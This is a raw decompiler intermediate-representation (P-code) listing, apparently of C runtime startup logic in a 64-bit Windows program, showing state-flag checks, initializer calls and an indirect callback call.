(ram, 0x1400045c0, 8) MULTIEQUAL (ram, 0x1400045c0, 8) , (ram, 0x1400045c0, 8)
(ram, 0x1400045b0, 8) MULTIEQUAL (ram, 0x1400045b0, 8) , (ram, 0x1400045b0, 8)
(ram, 0x1400045a0, 8) MULTIEQUAL (ram, 0x1400045a0, 8) , (ram, 0x1400045a0, 8)
(ram, 0x140004590, 8) MULTIEQUAL (ram, 0x140004590, 8) , (ram, 0x140004590, 8)
(ram, 0x140004520, 8) MULTIEQUAL (ram, 0x140004520, 8) , (ram, 0x140004520, 8)
(ram, 0x140004510, 8) MULTIEQUAL (ram, 0x140004510, 8) , (ram, 0x140004510, 8)
 ---  CALLOTHER (const, 0x11, 4)
(unique, 0x1000032d, 8) CAST (unique, 0x100002c5, 8)
(unique, 0x6800, 8) LOAD (const, 0x1b1, 4) , (unique, 0x1000032d, 8)
(register, 0x206, 1) INT_EQUAL (unique, 0x6800, 8) , (const, 0x0, 8)
 ---  CBRANCH (const, 0x3, 1) , (register, 0x206, 1)
(unique, 0x10000335, 8) CAST (unique, 0x100002c5, 8)
(ram, 0x140004510, 8) INDIRECT (ram, 0x140004510, 8) , (const, 0x3c, 4)
(ram, 0x140004520, 8) INDIRECT (ram, 0x140004520, 8) , (const, 0x3c, 4)
(ram, 0x140004590, 8) INDIRECT (ram, 0x140004590, 8) , (const, 0x3c, 4)
(ram, 0x1400045a0, 8) INDIRECT (ram, 0x1400045a0, 8) , (const, 0x3c, 4)
(ram, 0x1400045b0, 8) INDIRECT (ram, 0x1400045b0, 8) , (const, 0x3c, 4)
(ram, 0x1400045c0, 8) INDIRECT (ram, 0x1400045c0, 8) , (const, 0x3c, 4)
(ram, 0x1400045d0, 8) INDIRECT (ram, 0x1400045d0, 8) , (const, 0x3c, 4)
(ram, 0x1400045e0, 8) INDIRECT (ram, 0x1400045e0, 8) , (const, 0x3c, 4)
(ram, 0x1400045f0, 8) INDIRECT (ram, 0x1400045f0, 8) , (const, 0x3c, 4)
(ram, 0x140004630, 8) INDIRECT (ram, 0x140004630, 8) , (const, 0x3c, 4)
(ram, 0x140007008, 4) INDIRECT (ram, 0x140007008, 4) , (const, 0x3c, 4)
(ram, 0x14000700c, 4) INDIRECT (ram, 0x14000700c, 4) , (const, 0x3c, 4)
(ram, 0x140007010, 4) INDIRECT (ram, 0x140007010, 4) , (const, 0x3c, 4)
(ram, 0x140007018, 8) INDIRECT (ram, 0x140007018, 8) , (const, 0x3c, 4)
(ram, 0x140007020, 8) INDIRECT (ram, 0x140007020, 8) , (const, 0x3c, 4)
(ram, 0x140007028, 4) INDIRECT (ram, 0x140007028, 4) , (const, 0x3c, 4)
 ---  STORE (const, 0x1b1, 4) , (unique, 0x10000335, 8) , (unique, 0xdc00, 8)
(unique, 0x100002fd, 8) COPY (register, 0x38, 8)
(ram, 0x140007028, 4) MULTIEQUAL (ram, 0x140007028, 4) , (ram, 0x140007028, 4)
(ram, 0x140007020, 8) MULTIEQUAL (ram, 0x140007020, 8) , (ram, 0x140007020, 8)
(ram, 0x140007018, 8) MULTIEQUAL (ram, 0x140007018, 8) , (ram, 0x140007018, 8)
(ram, 0x140007010, 4) MULTIEQUAL (ram, 0x140007010, 4) , (ram, 0x140007010, 4)
(ram, 0x14000700c, 4) MULTIEQUAL (ram, 0x14000700c, 4) , (ram, 0x14000700c, 4)
(ram, 0x140007008, 4) MULTIEQUAL (ram, 0x140007008, 4) , (ram, 0x140007008, 4)
(ram, 0x140004630, 8) MULTIEQUAL (ram, 0x140004630, 8) , (ram, 0x140004630, 8)
(ram, 0x1400045f0, 8) MULTIEQUAL (ram, 0x1400045f0, 8) , (ram, 0x1400045f0, 8)
(ram, 0x1400045e0, 8) MULTIEQUAL (ram, 0x1400045e0, 8) , (ram, 0x1400045e0, 8)
(ram, 0x1400045d0, 8) MULTIEQUAL (ram, 0x1400045d0, 8) , (ram, 0x1400045d0, 8)
(ram, 0x1400045c0, 8) MULTIEQUAL (ram, 0x1400045c0, 8) , (ram, 0x1400045c0, 8)
(ram, 0x1400045b0, 8) MULTIEQUAL (ram, 0x1400045b0, 8) , (ram, 0x1400045b0, 8)
(ram, 0x1400045a0, 8) MULTIEQUAL (ram, 0x1400045a0, 8) , (ram, 0x1400045a0, 8)
(ram, 0x140004590, 8) MULTIEQUAL (ram, 0x140004590, 8) , (ram, 0x140004590, 8)
(ram, 0x140004520, 8) MULTIEQUAL (ram, 0x140004520, 8) , (ram, 0x140004520, 8)
(ram, 0x140004510, 8) MULTIEQUAL (ram, 0x140004510, 8) , (ram, 0x140004510, 8)
(register, 0x0, 8) MULTIEQUAL (unique, 0x100002fd, 8) , (unique, 0x6800, 8)
(unique, 0x100002dd, 8) COPY (ram, 0x1400045f0, 8)
(unique, 0x100002d5, 8) COPY (ram, 0x1400045e0, 8)
(unique, 0x100002cd, 8) COPY (ram, 0x1400045b0, 8)
 ---  CALLOTHER (const, 0x12, 4)
(register, 0x206, 1) INT_EQUAL (register, 0x0, 8) , (const, 0x0, 8)
 ---  CBRANCH (ram, 0x1400011b0, 1) , (register, 0x206, 1)
(unique, 0x100001b5, 1) COPY (const, 0x0, 1)
(unique, 0x1000033d, 8) CAST (ram, 0x1400045b0, 8)
(unique, 0xdb00, 4) LOAD (const, 0x1b1, 4) , (unique, 0x1000033d, 8)
(register, 0x206, 1) INT_EQUAL (unique, 0xdc00, 8) , (register, 0x0, 8)
 ---  CBRANCH (ram, 0x140001320, 1) , (register, 0x206, 1)
(unique, 0x100001b4, 1) COPY (const, 0x1, 1)
(unique, 0x10000345, 8) CAST (ram, 0x1400045b0, 8)
(unique, 0xdb00, 4) LOAD (const, 0x1b1, 4) , (unique, 0x10000345, 8)
(unique, 0xdb00, 4) MULTIEQUAL (unique, 0xdb00, 4) , (unique, 0xdb00, 4)
(unique, 0x100001bd, 1) MULTIEQUAL (unique, 0x100001b4, 1) , (unique, 0x100001b5, 1)
(unique, 0x100001bc, 1) INT_EQUAL (unique, 0xdb00, 4) , (const, 0x1, 4)
 ---  CBRANCH (ram, 0x1400011e1, 1) , (unique, 0x100001bc, 1)
(unique, 0x1000034d, 8) CAST (ram, 0x1400045b0, 8)
(unique, 0xdb00, 4) LOAD (const, 0x1b1, 4) , (unique, 0x1000034d, 8)
(register, 0x206, 1) INT_EQUAL (unique, 0xdb00, 4) , (const, 0x0, 4)
 ---  CBRANCH (ram, 0x1400013a0, 1) , (register, 0x206, 1)
(unique, 0x10000355, 8) CAST (ram, 0x1400045b0, 8)
(ram, 0x140004510, 8) INDIRECT (ram, 0x140004510, 8) , (const, 0x1e8, 4)
(ram, 0x140004520, 8) INDIRECT (ram, 0x140004520, 8) , (const, 0x1e8, 4)
(ram, 0x140004590, 8) INDIRECT (ram, 0x140004590, 8) , (const, 0x1e8, 4)
(ram, 0x1400045a0, 8) INDIRECT (ram, 0x1400045a0, 8) , (const, 0x1e8, 4)
(ram, 0x1400045b0, 8) INDIRECT (ram, 0x1400045b0, 8) , (const, 0x1e8, 4)
(ram, 0x1400045c0, 8) INDIRECT (ram, 0x1400045c0, 8) , (const, 0x1e8, 4)
(ram, 0x1400045d0, 8) INDIRECT (ram, 0x1400045d0, 8) , (const, 0x1e8, 4)
(ram, 0x1400045e0, 8) INDIRECT (ram, 0x1400045e0, 8) , (const, 0x1e8, 4)
(ram, 0x1400045f0, 8) INDIRECT (ram, 0x1400045f0, 8) , (const, 0x1e8, 4)
(ram, 0x140004630, 8) INDIRECT (ram, 0x140004630, 8) , (const, 0x1e8, 4)
(ram, 0x140007008, 4) INDIRECT (ram, 0x140007008, 4) , (const, 0x1e8, 4)
(ram, 0x14000700c, 4) INDIRECT (ram, 0x14000700c, 4) , (const, 0x1e8, 4)
(ram, 0x140007010, 4) INDIRECT (ram, 0x140007010, 4) , (const, 0x1e8, 4)
(ram, 0x140007018, 8) INDIRECT (ram, 0x140007018, 8) , (const, 0x1e8, 4)
(ram, 0x140007020, 8) INDIRECT (ram, 0x140007020, 8) , (const, 0x1e8, 4)
(ram, 0x140007028, 4) INDIRECT (ram, 0x140007028, 4) , (const, 0x1e8, 4)
 ---  STORE (const, 0x1b1, 4) , (unique, 0x10000355, 8) , (const, 0x1, 4)
(ram, 0x140004510, 8) INDIRECT (ram, 0x140004510, 8) , (const, 0x1eb, 4)
(ram, 0x140004520, 8) INDIRECT (ram, 0x140004520, 8) , (const, 0x1eb, 4)
(ram, 0x140004590, 8) INDIRECT (ram, 0x140004590, 8) , (const, 0x1eb, 4)
(ram, 0x1400045a0, 8) INDIRECT (ram, 0x1400045a0, 8) , (const, 0x1eb, 4)
(ram, 0x1400045b0, 8) INDIRECT (ram, 0x1400045b0, 8) , (const, 0x1eb, 4)
(ram, 0x1400045c0, 8) INDIRECT (ram, 0x1400045c0, 8) , (const, 0x1eb, 4)
(ram, 0x1400045d0, 8) INDIRECT (ram, 0x1400045d0, 8) , (const, 0x1eb, 4)
(ram, 0x1400045e0, 8) INDIRECT (ram, 0x1400045e0, 8) , (const, 0x1eb, 4)
(ram, 0x1400045f0, 8) INDIRECT (ram, 0x1400045f0, 8) , (const, 0x1eb, 4)
(ram, 0x140004630, 8) INDIRECT (ram, 0x140004630, 8) , (const, 0x1eb, 4)
(ram, 0x140007008, 4) INDIRECT (ram, 0x140007008, 4) , (const, 0x1eb, 4)
(ram, 0x14000700c, 4) INDIRECT (ram, 0x14000700c, 4) , (const, 0x1eb, 4)
(ram, 0x140007010, 4) INDIRECT (ram, 0x140007010, 4) , (const, 0x1eb, 4)
(ram, 0x140007018, 8) INDIRECT (ram, 0x140007018, 8) , (const, 0x1eb, 4)
(ram, 0x140007020, 8) INDIRECT (ram, 0x140007020, 8) , (const, 0x1eb, 4)
(ram, 0x140007028, 4) INDIRECT (ram, 0x140007028, 4) , (const, 0x1eb, 4)
 ---  CALL (ram, 0x1400027a8, 8) , (unique, 0x100002d5, 8) , (unique, 0x100002dd, 8)
 ---  BRANCH (ram, 0x1400011f5, 1)
(ram, 0x140007008, 4) COPY (const, 0x1, 4)
(ram, 0x140007028, 4) MULTIEQUAL (ram, 0x140007028, 4) , (ram, 0x140007028, 4)
(ram, 0x140007020, 8) MULTIEQUAL (ram, 0x140007020, 8) , (ram, 0x140007020, 8)
(ram, 0x140007018, 8) MULTIEQUAL (ram, 0x140007018, 8) , (ram, 0x140007018, 8)
(ram, 0x140007010, 4) MULTIEQUAL (ram, 0x140007010, 4) , (ram, 0x140007010, 4)
(ram, 0x14000700c, 4) MULTIEQUAL (ram, 0x14000700c, 4) , (ram, 0x14000700c, 4)
(ram, 0x140007008, 4) MULTIEQUAL (ram, 0x140007008, 4) , (ram, 0x140007008, 4)
(ram, 0x140004630, 8) MULTIEQUAL (ram, 0x140004630, 8) , (ram, 0x140004630, 8)
(ram, 0x1400045f0, 8) MULTIEQUAL (ram, 0x1400045f0, 8) , (ram, 0x1400045f0, 8)
(ram, 0x1400045e0, 8) MULTIEQUAL (ram, 0x1400045e0, 8) , (ram, 0x1400045e0, 8)
(ram, 0x1400045d0, 8) MULTIEQUAL (ram, 0x1400045d0, 8) , (ram, 0x1400045d0, 8)
(ram, 0x1400045c0, 8) MULTIEQUAL (ram, 0x1400045c0, 8) , (ram, 0x1400045c0, 8)
(ram, 0x1400045b0, 8) MULTIEQUAL (ram, 0x1400045b0, 8) , (ram, 0x1400045b0, 8)
(ram, 0x1400045a0, 8) MULTIEQUAL (ram, 0x1400045a0, 8) , (ram, 0x1400045a0, 8)
(ram, 0x140004590, 8) MULTIEQUAL (ram, 0x140004590, 8) , (ram, 0x140004590, 8)
(ram, 0x140004520, 8) MULTIEQUAL (ram, 0x140004520, 8) , (ram, 0x140004520, 8)
(ram, 0x140004510, 8) MULTIEQUAL (ram, 0x140004510, 8) , (ram, 0x140004510, 8)
(unique, 0x1000035d, 8) CAST (unique, 0x100002cd, 8)
(unique, 0xdb00, 4) LOAD (const, 0x1b1, 4) , (unique, 0x1000035d, 8)
(ram, 0x140004510, 8) INDIRECT (ram, 0x140004510, 8) , (const, 0x1f0, 4)
(ram, 0x140004520, 8) INDIRECT (ram, 0x140004520, 8) , (const, 0x1f0, 4)
(ram, 0x140004590, 8) INDIRECT (ram, 0x140004590, 8) , (const, 0x1f0, 4)
(ram, 0x1400045a0, 8) INDIRECT (ram, 0x1400045a0, 8) , (const, 0x1f0, 4)
(ram, 0x1400045b0, 8) INDIRECT (ram, 0x1400045b0, 8) , (const, 0x1f0, 4)
(ram, 0x1400045c0, 8) INDIRECT (ram, 0x1400045c0, 8) , (const, 0x1f0, 4)
(ram, 0x1400045d0, 8) INDIRECT (ram, 0x1400045d0, 8) , (const, 0x1f0, 4)
(ram, 0x1400045e0, 8) INDIRECT (ram, 0x1400045e0, 8) , (const, 0x1f0, 4)
(ram, 0x1400045f0, 8) INDIRECT (ram, 0x1400045f0, 8) , (const, 0x1f0, 4)
(ram, 0x140004630, 8) INDIRECT (ram, 0x140004630, 8) , (const, 0x1f0, 4)
(ram, 0x140007008, 4) INDIRECT (ram, 0x140007008, 4) , (const, 0x1f0, 4)
(ram, 0x14000700c, 4) INDIRECT (ram, 0x14000700c, 4) , (const, 0x1f0, 4)
(ram, 0x140007010, 4) INDIRECT (ram, 0x140007010, 4) , (const, 0x1f0, 4)
(ram, 0x140007018, 8) INDIRECT (ram, 0x140007018, 8) , (const, 0x1f0, 4)
(ram, 0x140007020, 8) INDIRECT (ram, 0x140007020, 8) , (const, 0x1f0, 4)
(ram, 0x140007028, 4) INDIRECT (ram, 0x140007028, 4) , (const, 0x1f0, 4)
 ---  CALL (ram, 0x140002798, 8) , (const, 0x1f, 4)
(unique, 0x10000365, 8) CAST (unique, 0x100002cd, 8)
(unique, 0xdb00, 4) LOAD (const, 0x1b1, 4) , (unique, 0x10000365, 8)
(unique, 0xdb00, 4) MULTIEQUAL (unique, 0xdb00, 4) , (unique, 0xdb00, 4)
(unique, 0x10000237, 8) MULTIEQUAL (ram, 0x140004510, 8) , (ram, 0x140004510, 8)
(unique, 0x1000023f, 8) MULTIEQUAL (ram, 0x140004520, 8) , (ram, 0x140004520, 8)
(unique, 0x10000247, 8) MULTIEQUAL (ram, 0x140004590, 8) , (ram, 0x140004590, 8)
(unique, 0x1000024f, 8) MULTIEQUAL (ram, 0x1400045a0, 8) , (ram, 0x1400045a0, 8)
(unique, 0x10000257, 8) MULTIEQUAL (ram, 0x1400045b0, 8) , (ram, 0x1400045b0, 8)
(unique, 0x1000025f, 8) MULTIEQUAL (ram, 0x1400045c0, 8) , (ram, 0x1400045c0, 8)
(unique, 0x10000267, 8) MULTIEQUAL (ram, 0x1400045d0, 8) , (ram, 0x1400045d0, 8)
(unique, 0x1000026f, 8) MULTIEQUAL (ram, 0x1400045e0, 8) , (ram, 0x1400045e0, 8)
(unique, 0x10000277, 8) MULTIEQUAL (ram, 0x1400045f0, 8) , (ram, 0x1400045f0, 8)
(unique, 0x1000027f, 8) MULTIEQUAL (ram, 0x140004630, 8) , (ram, 0x140004630, 8)
(unique, 0x10000287, 4) MULTIEQUAL (ram, 0x140007008, 4) , (ram, 0x140007008, 4)
(unique, 0x1000028b, 4) MULTIEQUAL (ram, 0x14000700c, 4) , (ram, 0x14000700c, 4)
(unique, 0x1000028f, 4) MULTIEQUAL (ram, 0x140007010, 4) , (ram, 0x140007010, 4)
(unique, 0x10000293, 8) MULTIEQUAL (ram, 0x140007018, 8) , (ram, 0x140007018, 8)
(unique, 0x1000029b, 8) MULTIEQUAL (ram, 0x140007020, 8) , (ram, 0x140007020, 8)
(unique, 0x100002a3, 4) MULTIEQUAL (ram, 0x140007028, 4) , (ram, 0x140007028, 4)
(unique, 0x10000236, 1) INT_EQUAL (unique, 0xdb00, 4) , (const, 0x1, 4)
 ---  CBRANCH (ram, 0x14000134c, 1) , (unique, 0x10000236, 1)
(ram, 0x140004510, 8) INDIRECT (unique, 0x10000237, 8) , (const, 0x1d7, 4)
(ram, 0x140004520, 8) INDIRECT (unique, 0x1000023f, 8) , (const, 0x1d7, 4)
(ram, 0x140004590, 8) INDIRECT (unique, 0x10000247, 8) , (const, 0x1d7, 4)
(ram, 0x1400045a0, 8) INDIRECT (unique, 0x1000024f, 8) , (const, 0x1d7, 4)
(ram, 0x1400045b0, 8) INDIRECT (unique, 0x10000257, 8) , (const, 0x1d7, 4)
(ram, 0x1400045c0, 8) INDIRECT (unique, 0x1000025f, 8) , (const, 0x1d7, 4)
(ram, 0x1400045d0, 8) INDIRECT (unique, 0x10000267, 8) , (const, 0x1d7, 4)
(ram, 0x1400045e0, 8) INDIRECT (unique, 0x1000026f, 8) , (const, 0x1d7, 4)
(ram, 0x1400045f0, 8) INDIRECT (unique, 0x10000277, 8) , (const, 0x1d7, 4)
(ram, 0x140004630, 8) INDIRECT (unique, 0x1000027f, 8) , (const, 0x1d7, 4)
(ram, 0x140007008, 4) INDIRECT (unique, 0x10000287, 4) , (const, 0x1d7, 4)
(ram, 0x14000700c, 4) INDIRECT (unique, 0x1000028b, 4) , (const, 0x1d7, 4)
(ram, 0x140007010, 4) INDIRECT (unique, 0x1000028f, 4) , (const, 0x1d7, 4)
(ram, 0x140007018, 8) INDIRECT (unique, 0x10000293, 8) , (const, 0x1d7, 4)
(ram, 0x140007020, 8) INDIRECT (unique, 0x1000029b, 8) , (const, 0x1d7, 4)
(ram, 0x140007028, 4) INDIRECT (unique, 0x100002a3, 4) , (const, 0x1d7, 4)
 ---  CALL (ram, 0x1400027a8, 8) , (unique, 0x1000025f, 8) , (unique, 0x10000267, 8)
(unique, 0x1000036d, 8) CAST (unique, 0x100002cd, 8)
(ram, 0x140004510, 8) INDIRECT (ram, 0x140004510, 8) , (const, 0x1d9, 4)
(ram, 0x140004520, 8) INDIRECT (ram, 0x140004520, 8) , (const, 0x1d9, 4)
(ram, 0x140004590, 8) INDIRECT (ram, 0x140004590, 8) , (const, 0x1d9, 4)
(ram, 0x1400045a0, 8) INDIRECT (ram, 0x1400045a0, 8) , (const, 0x1d9, 4)
(ram, 0x1400045b0, 8) INDIRECT (ram, 0x1400045b0, 8) , (const, 0x1d9, 4)
(ram, 0x1400045c0, 8) INDIRECT (ram, 0x1400045c0, 8) , (const, 0x1d9, 4)
(ram, 0x1400045d0, 8) INDIRECT (ram, 0x1400045d0, 8) , (const, 0x1d9, 4)
(ram, 0x1400045e0, 8) INDIRECT (ram, 0x1400045e0, 8) , (const, 0x1d9, 4)
(ram, 0x1400045f0, 8) INDIRECT (ram, 0x1400045f0, 8) , (const, 0x1d9, 4)
(ram, 0x140004630, 8) INDIRECT (ram, 0x140004630, 8) , (const, 0x1d9, 4)
(ram, 0x140007008, 4) INDIRECT (ram, 0x140007008, 4) , (const, 0x1d9, 4)
(ram, 0x14000700c, 4) INDIRECT (ram, 0x14000700c, 4) , (const, 0x1d9, 4)
(ram, 0x140007010, 4) INDIRECT (ram, 0x140007010, 4) , (const, 0x1d9, 4)
(ram, 0x140007018, 8) INDIRECT (ram, 0x140007018, 8) , (const, 0x1d9, 4)
(ram, 0x140007020, 8) INDIRECT (ram, 0x140007020, 8) , (const, 0x1d9, 4)
(ram, 0x140007028, 4) INDIRECT (ram, 0x140007028, 4) , (const, 0x1d9, 4)
 ---  STORE (const, 0x1b1, 4) , (unique, 0x1000036d, 8) , (const, 0x2, 4)
(unique, 0x100001be, 8) MULTIEQUAL (ram, 0x140004510, 8) , (unique, 0x10000237, 8)
(unique, 0x100001c6, 8) MULTIEQUAL (ram, 0x140004520, 8) , (unique, 0x1000023f, 8)
(unique, 0x100001ce, 8) MULTIEQUAL (ram, 0x140004590, 8) , (unique, 0x10000247, 8)
(unique, 0x100001d6, 8) MULTIEQUAL (ram, 0x1400045a0, 8) , (unique, 0x1000024f, 8)
(unique, 0x100001de, 8) MULTIEQUAL (ram, 0x1400045b0, 8) , (unique, 0x10000257, 8)
(unique, 0x100001e6, 8) MULTIEQUAL (ram, 0x1400045c0, 8) , (unique, 0x1000025f, 8)
(unique, 0x100001ee, 8) MULTIEQUAL (ram, 0x1400045d0, 8) , (unique, 0x10000267, 8)
(unique, 0x100001f6, 8) MULTIEQUAL (ram, 0x1400045e0, 8) , (unique, 0x1000026f, 8)
(unique, 0x100001fe, 8) MULTIEQUAL (ram, 0x1400045f0, 8) , (unique, 0x10000277, 8)
(unique, 0x10000206, 8) MULTIEQUAL (ram, 0x140004630, 8) , (unique, 0x1000027f, 8)
(unique, 0x1000020e, 4) MULTIEQUAL (ram, 0x140007008, 4) , (unique, 0x10000287, 4)
(unique, 0x10000212, 4) MULTIEQUAL (ram, 0x14000700c, 4) , (unique, 0x1000028b, 4)
(unique, 0x10000216, 4) MULTIEQUAL (ram, 0x140007010, 4) , (unique, 0x1000028f, 4)
(unique, 0x1000021a, 8) MULTIEQUAL (ram, 0x140007018, 8) , (unique, 0x10000293, 8)
(unique, 0x10000222, 8) MULTIEQUAL (ram, 0x140007020, 8) , (unique, 0x1000029b, 8)
(unique, 0x1000022a, 4) MULTIEQUAL (ram, 0x140007028, 4) , (unique, 0x100002a3, 4)
(unique, 0x10000235, 1) BOOL_NEGATE (unique, 0x100001bd, 1)
 ---  CBRANCH (ram, 0x140001208, 1) , (unique, 0x10000235, 1)
 ---  CALLOTHER (const, 0x11, 4)
(unique, 0x10000375, 8) CAST (unique, 0x100002c5, 8)
(ram, 0x140004510, 8) INDIRECT (unique, 0x100001be, 8) , (const, 0x1cf, 4)
(ram, 0x140004520, 8) INDIRECT (unique, 0x100001c6, 8) , (const, 0x1cf, 4)
(ram, 0x140004590, 8) INDIRECT (unique, 0x100001ce, 8) , (const, 0x1cf, 4)
(ram, 0x1400045a0, 8) INDIRECT (unique, 0x100001d6, 8) , (const, 0x1cf, 4)
(ram, 0x1400045b0, 8) INDIRECT (unique, 0x100001de, 8) , (const, 0x1cf, 4)
(ram, 0x1400045c0, 8) INDIRECT (unique, 0x100001e6, 8) , (const, 0x1cf, 4)
(ram, 0x1400045d0, 8) INDIRECT (unique, 0x100001ee, 8) , (const, 0x1cf, 4)
(ram, 0x1400045e0, 8) INDIRECT (unique, 0x100001f6, 8) , (const, 0x1cf, 4)
(ram, 0x1400045f0, 8) INDIRECT (unique, 0x100001fe, 8) , (const, 0x1cf, 4)
(ram, 0x140004630, 8) INDIRECT (unique, 0x10000206, 8) , (const, 0x1cf, 4)
(ram, 0x140007008, 4) INDIRECT (unique, 0x1000020e, 4) , (const, 0x1cf, 4)
(ram, 0x14000700c, 4) INDIRECT (unique, 0x10000212, 4) , (const, 0x1cf, 4)
(ram, 0x140007010, 4) INDIRECT (unique, 0x10000216, 4) , (const, 0x1cf, 4)
(ram, 0x140007018, 8) INDIRECT (unique, 0x1000021a, 8) , (const, 0x1cf, 4)
(ram, 0x140007020, 8) INDIRECT (unique, 0x10000222, 8) , (const, 0x1cf, 4)
(ram, 0x140007028, 4) INDIRECT (unique, 0x1000022a, 4) , (const, 0x1cf, 4)
 ---  STORE (const, 0x1b1, 4) , (unique, 0x10000375, 8) , (const, 0x0, 8)
 ---  CALLOTHER (const, 0x12, 4)
 ---  BRANCH (ram, 0x140001208, 1)
(ram, 0x140007028, 4) MULTIEQUAL (unique, 0x1000022a, 4) , (ram, 0x140007028, 4)
(ram, 0x140007020, 8) MULTIEQUAL (unique, 0x10000222, 8) , (ram, 0x140007020, 8)
(ram, 0x140007018, 8) MULTIEQUAL (unique, 0x1000021a, 8) , (ram, 0x140007018, 8)
(ram, 0x140007010, 4) MULTIEQUAL (unique, 0x10000216, 4) , (ram, 0x140007010, 4)
(ram, 0x14000700c, 4) MULTIEQUAL (unique, 0x10000212, 4) , (ram, 0x14000700c, 4)
(ram, 0x140007008, 4) MULTIEQUAL (unique, 0x1000020e, 4) , (ram, 0x140007008, 4)
(ram, 0x140004630, 8) MULTIEQUAL (unique, 0x10000206, 8) , (ram, 0x140004630, 8)
(ram, 0x1400045f0, 8) MULTIEQUAL (unique, 0x100001fe, 8) , (ram, 0x1400045f0, 8)
(ram, 0x1400045e0, 8) MULTIEQUAL (unique, 0x100001f6, 8) , (ram, 0x1400045e0, 8)
(ram, 0x1400045d0, 8) MULTIEQUAL (unique, 0x100001ee, 8) , (ram, 0x1400045d0, 8)
(ram, 0x1400045c0, 8) MULTIEQUAL (unique, 0x100001e6, 8) , (ram, 0x1400045c0, 8)
(ram, 0x1400045b0, 8) MULTIEQUAL (unique, 0x100001de, 8) , (ram, 0x1400045b0, 8)
(ram, 0x1400045a0, 8) MULTIEQUAL (unique, 0x100001d6, 8) , (ram, 0x1400045a0, 8)
(ram, 0x140004590, 8) MULTIEQUAL (unique, 0x100001ce, 8) , (ram, 0x140004590, 8)
(ram, 0x140004520, 8) MULTIEQUAL (unique, 0x100001c6, 8) , (ram, 0x140004520, 8)
(ram, 0x140004510, 8) MULTIEQUAL (unique, 0x100001be, 8) , (ram, 0x140004510, 8)
(unique, 0x1000037d, 8) CAST (ram, 0x140004510, 8)
(unique, 0xdc00, 8) LOAD (const, 0x1b1, 4) , (unique, 0x1000037d, 8)
(register, 0x206, 1) INT_NOTEQUAL (unique, 0xdc00, 8) , (const, 0x0, 8)
 ---  CBRANCH (ram, 0x140001223, 1) , (register, 0x206, 1)
(ram, 0x140004510, 8) INDIRECT (ram, 0x140004510, 8) , (const, 0xad, 4)
(ram, 0x140004520, 8) INDIRECT (ram, 0x140004520, 8) , (const, 0xad, 4)
(ram, 0x140004590, 8) INDIRECT (ram, 0x140004590, 8) , (const, 0xad, 4)
(ram, 0x1400045a0, 8) INDIRECT (ram, 0x1400045a0, 8) , (const, 0xad, 4)
(ram, 0x1400045b0, 8) INDIRECT (ram, 0x1400045b0, 8) , (const, 0xad, 4)
(ram, 0x1400045c0, 8) INDIRECT (ram, 0x1400045c0, 8) , (const, 0xad, 4)
(ram, 0x1400045d0, 8) INDIRECT (ram, 0x1400045d0, 8) , (const, 0xad, 4)
(ram, 0x1400045e0, 8) INDIRECT (ram, 0x1400045e0, 8) , (const, 0xad, 4)
(ram, 0x1400045f0, 8) INDIRECT (ram, 0x1400045f0, 8) , (const, 0xad, 4)
(ram, 0x140004630, 8) INDIRECT (ram, 0x140004630, 8) , (const, 0xad, 4)
(ram, 0x140007008, 4) INDIRECT (ram, 0x140007008, 4) , (const, 0xad, 4)
(ram, 0x14000700c, 4) INDIRECT (ram, 0x14000700c, 4) , (const, 0xad, 4)
(ram, 0x140007010, 4) INDIRECT (ram, 0x140007010, 4) , (const, 0xad, 4)
(ram, 0x140007018, 8) INDIRECT (ram, 0x140007018, 8) , (const, 0xad, 4)
(ram, 0x140007020, 8) INDIRECT (ram, 0x140007020, 8) , (const, 0xad, 4)
(ram, 0x140007028, 4) INDIRECT (ram, 0x140007028, 4) , (const, 0xad, 4)
 ---  CALLIND (unique, 0xdc00, 8) , (const, 0x0, 8) , (const, 0x2, 8) , (const, 0x0, 8)
(ram, 0x140007028, 4) MULTIEQUAL (ram, 0x140007028, 4) , (ram, 0x140007028, 4)
(ram, 0x140007020, 8) MULTIEQUAL (ram, 0x140007020, 8) , (ram, 0x140007020, 8)
(ram, 0x140007018, 8) MULTIEQUAL (ram, 0x140007018, 8) , (ram, 0x140007018, 8)
(ram, 0x140007010, 4) MULTIEQUAL (ram, 0x140007010, 4) , (ram, 0x140007010, 4)
(ram, 0x14000700c, 4) MULTIEQUAL (ram, 0x14000700c, 4) , (ram, 0x14000700c, 4)
(ram, 0x140007008, 4) MULTIEQUAL (ram, 0x140007008, 4) , (ram, 0x140007008, 4)
(ram, 0x140004630, 8) MULTIEQUAL (ram, 0x140004630, 8) , (ram, 0x140004630, 8)
(ram, 0x1400045f0, 8) MULTIEQUAL (ram, 0x1400045f0, 8) , (ram, 0x1400045f0, 8)
(ram, 0x1400045e0, 8) MULTIEQUAL (ram, 0x1400045e0, 8) , (ram, 0x1400045e0, 8)
(ram, 0x1400045d0, 8) MULTIEQUAL (ram, 0x1400045d0, 8) , (ram, 0x1400045d0, 8)
(ram, 0x1400045c0, 8) MULTIEQUAL (ram, 0x1400045c0, 8) , (ram, 0x1400045c0, 8)
(ram, 0x1400045b0, 8) MULTIEQUAL (ram, 0x1400045b0, 8) , (ram, 0x1400045b0, 8)
(ram, 0x1400045a0, 8) MULTIEQUAL (ram, 0x1400045a0, 8) , (ram, 0x1400045a0, 8)
(ram, 0x140004590, 8) MULTIEQUAL (ram, 0x140004590, 8) , (ram, 0x140004590, 8)
(ram, 0x140004520, 8) MULTIEQUAL (ram, 0x140004520, 8) , (ram, 0x140004520, 8)
(ram, 0x140004510, 8) MULTIEQUAL (ram, 0x140004510, 8) , (ram, 0x140004510, 8)
(ram, 0x140004510, 8) INDIRECT (ram, 0x140004510, 8) , (const, 0xb0, 4)
(ram, 0x140004520, 8) INDIRECT (ram, 0x140004520, 8) , (const, 0xb0, 4)
(ram, 0x140004590, 8) INDIRECT (ram, 0x140004590, 8) , (const, 0xb0, 4)
(ram, 0x1400045a0, 8) INDIRECT (ram, 0x1400045a0, 8) , (const, 0xb0, 4)
(ram, 0x1400045b0, 8) INDIRECT (ram, 0x1400045b0, 8) , (const, 0xb0, 4)
(ram, 0x1400045c0, 8) INDIRECT (ram, 0x1400045c0, 8) , (const, 0xb0, 4)
(ram, 0x1400045d0, 8) INDIRECT (ram, 0x1400045d0, 8) , (const, 0xb0, 4)
(ram, 0x1400045e0, 8) INDIRECT (ram, 0x1400045e0, 8) , (const, 0xb0, 4)
(ram, 0x1400045f0, 8) INDIRECT (ram, 0x1400045f0, 8) , (const, 0xb0, 4)
(ram, 0x140004630, 8) INDIRECT (ram, 0x140004630, 8) , (const, 0xb0, 4)
(ram, 0x140007008, 4) INDIRECT (ram, 0x140007008, 4) , (const, 0xb0, 4)
